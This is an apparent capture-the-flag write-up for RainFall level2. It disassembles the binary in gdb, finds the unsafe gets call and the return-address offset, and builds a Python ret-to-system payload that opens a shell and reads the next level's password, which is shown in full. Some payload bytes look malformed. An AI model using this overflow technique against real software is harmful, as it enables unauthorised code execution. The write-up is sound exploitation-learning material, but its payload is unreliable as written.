1. See files and try to use:
	level2@RainFall:~$ ./level2
	a
	a
Take input and write it.
2. Analyze with gdb:
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
We have function p, analyze it
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
We have gets function, it have vulnerability.
Gets vulnerability is mean that we could to overfull local variable array and put this array to gets.
After it gets let us to control stack and we could to perform our own command via call them with address of programs.
https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351

Try to find EIP offset:
(gdb) r
Starting program: /home/user/level2/level2
l;sakdhflkjshgkljfdskjhd;lshdflsjdhgkljdfhkgjdhsfkljhgsfkjhdklsjghdslkjghdkljhgkldjhfglkdjshgkldjshgkljdhfkgljhdskgjhfdslgjhdslkfgjhdskljhfgkldsjhfgldjshfglkjdshfglsdkjhfglkdjhfgkldjhs
l;sakdhflkjshgkljfdskjhd;lshdflsjdhgkljdfhkgjdhsfkljhgsfkjhdklsjldjhlkjghdkljhgkldjhfglkdjshgkldjshgkljdhfkgljhdskgjhfdslgjhdslkfgjhdskljhfgkldsjhfgldjshfglkjdshfglsdkjhfglkdjhfgkldjhs

Program received signal SIGSEGV, Segmentation fault.
0x686a646c in ?? ()

Maybe is it 80 like at previous step?
Why 80? Because 76 cells of array will be fill with trash and + 4 bytes than instead ret to call function
system. Function system is open for us access to perform our command.
	python -c 'print "A" * 80 + "BBBB"' > /tmp/test2

At first we should to find address of ret and system programms address than to pass them to input.
gdb> info function ret <- than to find address of ret
gdb> info function system <- than to find address of system.



python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x0\x33\x48\x08" + "b" * 4 + "\x35\xf9\xff\xbf"' > /tmp/breaker2

cat /tmp/breaker2 - | ./level2

cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
0x8048330

! Узнать адрес ret, system и собственного шеллкода, который закинули в env, а затем заполнить стэк? заменить рет на систем команду, затем заполнить еще 4 байта и вызывать шелл код